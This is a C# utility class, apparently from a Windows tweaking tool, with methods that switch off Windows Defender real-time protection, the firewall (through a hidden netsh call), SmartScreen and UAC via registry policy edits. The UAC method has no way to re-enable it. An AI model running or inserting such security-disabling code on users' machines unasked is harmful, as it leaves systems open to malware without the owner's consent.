using Microsoft.Win32;
using System;
using System.Diagnostics;
using System.Linq;


namespace Pluton.WindowsSystemFeatures
{
    public static class PSecuritySystems
    {
        public static void WindowsDefender(bool enable)
        {
            try
            {
                RegistryKey disableAntiSpyware = Registry.LocalMachine.CreateSubKey(@"Software\Policies\Microsoft\Windows Defender");
                RegistryKey DisableAntivirus = Registry.LocalMachine.CreateSubKey(@"Software\Policies\Microsoft\Windows Defender\Real-Time Protection");
                if (!enable)
                {

                    disableAntiSpyware.SetValue("DisableAntiSpyware", "1", RegistryValueKind.DWord);
                    disableAntiSpyware.Close();

                    DisableAntivirus.SetValue("DisableBehaviorMonitoring", "1", RegistryValueKind.DWord);
                    DisableAntivirus.SetValue("DisableScanOnRealtimeEnable", "1", RegistryValueKind.DWord);
                    DisableAntivirus.SetValue("DisableOnAccessProtection", "1", RegistryValueKind.DWord);
                    DisableAntivirus.Close();
                }
                else
                {

                    disableAntiSpyware.DeleteValue("DisableAntiSpyware");
                    disableAntiSpyware.Close();

                    DisableAntivirus.DeleteValue("DisableBehaviorMonitoring");
                    DisableAntivirus.DeleteValue("DisableScanOnRealtimeEnable");
                    DisableAntivirus.DeleteValue("DisableOnAccessProtection");
                    DisableAntivirus.Close();


                }
            }
            catch (Exception e)
            {
                Console.WriteLine(e);
            }

        }

        public static void Firewall(bool enable)
        {
            Process proc = new Process();
            string top = "netsh.exe";
            if (!enable)
            {
                proc.StartInfo.Arguments = "advfirewall set allprofiles state off";
                proc.StartInfo.FileName = top;
                proc.StartInfo.UseShellExecute = false;
                proc.StartInfo.RedirectStandardOutput = true;
                proc.StartInfo.CreateNoWindow = true;
                proc.Start();
                proc.WaitForExit();
            }
            else
            {

                proc.StartInfo.Arguments = "advfirewall set allprofiles state on";
                proc.StartInfo.FileName = top;
                proc.StartInfo.UseShellExecute = false;
                proc.StartInfo.RedirectStandardOutput = true;
                proc.StartInfo.CreateNoWindow = true;
                proc.Start();
                proc.WaitForExit();
            }
        }

        public static void SmartScreen(bool enable)
        {
            try
            {
                RegistryKey disableSmartscreen = Registry.LocalMachine.CreateSubKey(@"Software\Policies\Microsoft\Windows\System");
                disableSmartscreen.SetValue("EnableSmartScreen", enable ? "1" : "0", RegistryValueKind.DWord);
                disableSmartscreen.Close();
            }
            catch (Exception e)
            {
                Console.WriteLine(e);
            }
        }

        public static void DisableUAC()
        {
            try
            {
                Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Action Center\\Checks\\{C8E6F269-B90A-4053-A3BE-499AFCEC98C4}.check.0", "CheckSetting", StringToByteArray("23004100430042006C006F00620000000000000000000000010000000000000000000000"), RegistryValueKind.Binary);

                RegistryKey uac = Registry.LocalMachine.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", true);
                uac = Registry.LocalMachine.CreateSubKey(("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System"));


                uac.SetValue("ConsentPromptBehaviorAdmin", 0);
                uac.SetValue("PromptOnSecureDesktop", 0);
                uac.SetValue("EnableLUA", 0);
                uac.Close();
            }
            catch (Exception e)
            {
                Console.WriteLine(e);
            }
        }






        // NOT PART OF THE ACTUAL CLASS.
        private static byte[] StringToByteArray(string hex)
        {
            return Enumerable.Range(0, hex.Length)
                             .Where(x => x % 2 == 0)
                             .Select(x => Convert.ToByte(hex.Substring(x, 2), 16))
                             .ToArray();
        }
    }
}
